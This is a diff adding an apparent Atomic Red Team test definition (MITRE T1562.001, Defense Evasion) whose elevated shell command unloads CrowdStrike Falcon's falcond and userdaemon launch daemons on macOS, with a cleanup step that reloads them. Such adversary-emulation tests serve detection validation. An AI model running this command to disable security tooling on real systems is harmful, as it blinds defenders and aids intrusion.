@@ -1,0 +1,36 @@
+{
+    "name": "Stop and unload Crowdstrike Falcon on macOS",
+    "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS ",
+    "supported_platforms": [
+        "macos"
+    ],
+    "executor": {
+        "command": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}\n",
+        "cleanup_command": "sudo launchctl load -w #{falcond_plist}\nsudo launchctl load -w #{userdaemon_plist}\n",
+        "name": "sh",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1562.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Tools",
+    "source": "ART",
+    "uuid": "b3e7510c-2d4c-4249-a33f-591a2bc83eef",
+    "arguments": {
+        "falcond_plist": {
+            "description": "The path of the Crowdstrike Falcon plist file",
+            "type": "path",
+            "default": "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"
+        },
+        "userdaemon_plist": {
+            "description": "The path of the Crowdstrike Userdaemon plist file",
+            "type": "path",
+            "default": "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
